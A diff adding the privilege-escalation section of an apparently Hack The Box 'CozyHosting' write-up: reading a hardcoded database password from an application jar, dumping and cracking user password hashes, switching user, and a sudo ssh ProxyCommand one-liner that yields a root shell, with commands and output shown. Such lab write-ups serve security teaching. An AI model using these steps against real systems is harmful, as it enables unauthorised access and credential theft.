@@ -261,5 +261,124 @@ export term=XTERM
 press ctrl + z
 stty raw -echo; fg
 ```
+## Phase 4: Privilege Escalation
 
-Now we have good shell.
+
+
+Now we have good shell. In /home directory we have a sub-directory `josh` to whom we don't have access.
+```bash
+app@cozyhosting:/app$ cd /home
+app@cozyhosting:/home$ ls
+josh
+app@cozyhosting:/home$ cd josh
+bash: cd: josh: Permission denied
+```
+
+### Lateral/horizontal privilege escalation
+okay. Let's see how we can get some horizontal privilege escalation. In our /app directory we have a jar file `cloudhosting-0.0.1.jar`. Trying to unzip gives us an error, so let's copy the file in /tmp directory: `cp cloudhosting-0.0.1.jar /tmp/` and unzip it: `unzip /tmp/cloudhosting-0.0.1.jar`. We get two directories `BOOT_INF` and `META_INF`. META_INF contains some metadata. so we will look to it later. In BOOT_INF we have some fishy information. 
+
+```bash
+app@cozyhosting:/tmp$ cd BOOT-INF/
+app@cozyhosting:/tmp/BOOT-INF$ ls
+classes  classpath.idx  layers.idx  lib
+app@cozyhosting:/tmp/BOOT-INF$ cd classes
+app@cozyhosting:/tmp/BOOT-INF/classes$ ls
+application.properties  htb  static  templates
+app@cozyhosting:/tmp/BOOT-INF/classes$ cat application.properties 
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR 
+```
+
+We have a postgresql server running on localhost and we have it's cedentials. Let's dig in.
+
+```bash
+app@cozyhosting:/tmp/BOOT-INF/classes$ psql -h localhost -U postgres
+Password for user postgres: 
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=#
+```
+
+here you can see databases using \l command and then \c to switch to particular databases. then \d to list available tables. 
+
+```bash
+
+postgres=# \l
+postgres=# \c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+cozyhosting=# \d
+cozyhosting=# SELECT * FROM users;
+
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+```
+
+we got the hashes for kanderson and admin user. We can use [hashes.io](https://hashes.io) to decrypt the hashes.
+
+![hashes decoded](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/hash_decoded.png)
+
+We got the password for Kanderson. But there was only one user `josh` in /home directory so kanderson must be the josh.. Let's try logging in as josh.
+
+```bash
+app@cozyhosting:/tmp/BOOT-INF/classes$ su josh
+Password: 
+josh@cozyhosting:/tmp/BOOT-INF/classes$ 
+```
+
+And we are logged in. Now we can easily grab the user.txt with following command series.
+```bash
+josh@cozyhosting:/tmp/BOOT-INF/classes$ cd /home/josh
+josh@cozyhosting:~$ ls
+user.txt
+josh@cozyhosting:~$ cat user.txt
+36******************************
+```
+
+### Vertical privilege escalation
+
+While enumeratin, `sudo -l` gives us that user josh can run `/usr/bin/ssh` with root privilege on this system.
+
+```bash
+josh@cozyhosting:~$ sudo -l
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+Now time to check GTFOBins. There I found how I can run a Proxy command within the ssh command to get a shell. [Refer this link](https://gtfobins.github.io/gtfobins/ssh/#sudo)
+
+![proxy command within ssh](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/command_in_ssh.png)
+
+Using the same trick, We can easily get the shell as root and after that grabbing the root.txt file should not be hard,
+
+```bash
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# cat /root/root.txt
+41******************************
+# 
+```
+
+And Voila, we got root access. That was quiet easy. Thanks for reading this writeup. Hope u liked it.
+
+![cozyhosting pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/cozyhosting_pwned.png)
